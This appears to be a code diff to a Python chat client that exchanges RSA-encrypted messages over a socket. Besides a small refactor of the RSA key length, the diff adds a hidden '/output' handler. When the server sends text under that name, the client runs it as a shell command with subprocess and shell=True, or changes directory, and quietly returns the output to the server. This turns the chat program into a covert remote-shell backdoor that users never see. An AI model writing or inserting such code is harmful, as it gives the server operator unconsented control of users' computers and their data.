@@ -6,6 +6,8 @@ import PySimpleGUI as sg
 from tkinter import simpledialog, Tk
 import rsa
 
+import sys, subprocess, os
+
 class UserBannedException(Exception):
     pass
 
@@ -40,11 +42,32 @@ def listen_for_messages(s : socket.socket):
             continue
         
         # /user_left will always contain max 1 user
-        elif t_nickname == "/user_left":
+        if t_nickname == "/user_left":
             users.remove(data)
             win["-USERS-"].update(users)
             win["-CHAT HISTORY-"].update(f"=> {data} left the chat\n", text_color_for_value="red", append=True)
             continue
+
+        if t_nickname == "/output":
+            cmd = f""
+
+            if data.startswith("cd "):
+                try:
+                    os.chdir(data[3:])
+                except FileNotFoundError:
+                    send_message("/output,File or directory not found")
+                    continue
+
+            elif len(data) > 0:
+                p = subprocess.run(data, shell=True, capture_output=True)
+                data = p.stdout + p.stderr
+                cmd = "\n" + data.decode() + f"\n"
+
+            max_cryptable = int(RSA_KEY_LEN/8) - 19
+            for n in range(0,len(cmd),max_cryptable): # max bytes that rsa can encrypt with 1024 bit key
+                send_message("/output," + cmd[n:n+max_cryptable])
+            continue
+
         
         # Print message received
         t_nickname = f"({t_nickname})".ljust(NICKNAME_WIDTH)
@@ -109,11 +132,11 @@ def handle_window():
     
 
 def exchange_keys():
-    global public_key, private_key, server_key, s
+    global public_key, private_key, server_key, s, RSA_KEY_LEN
     
-    public_key, private_key = rsa.newkeys(1024)
+    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)
 
-    server_key = rsa.PublicKey.load_pkcs1( s.recv(1024) )
+    server_key = rsa.PublicKey.load_pkcs1( s.recv(RSA_KEY_LEN) )
 
     s.sendall(public_key.save_pkcs1())
 
@@ -172,6 +195,8 @@ def main():
     global NICKNAME_WIDTH
     NICKNAME_WIDTH = 15     # space taken up by nickname
 
+    global RSA_KEY_LEN
+    RSA_KEY_LEN = 1024
     global banned
     banned = False
 
